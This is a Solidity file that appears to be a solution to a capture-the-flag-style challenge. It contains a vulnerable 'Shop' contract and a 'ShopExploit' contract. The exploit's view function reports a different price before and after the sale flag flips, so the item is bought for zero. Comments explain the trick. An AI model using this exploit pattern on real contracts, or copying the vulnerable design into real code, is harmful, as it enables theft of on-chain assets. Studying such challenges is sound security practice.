// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

// we can answer Shop.price when isSold is still false,
// which will satisfy the if condition, and then answer
// a different price after isSold is true, when the answered
// price will really be stored.

contract ShopExploit is Buyer {
    function buy() public {
      Shop(0x352f1eC71009C15b3b5E49e7782877DcEE552984).buy();
    }

    function price() public view override returns (uint) {
        Shop shop = Shop(msg.sender);
        return (shop.isSold())? 0 : shop.price();
    }
}
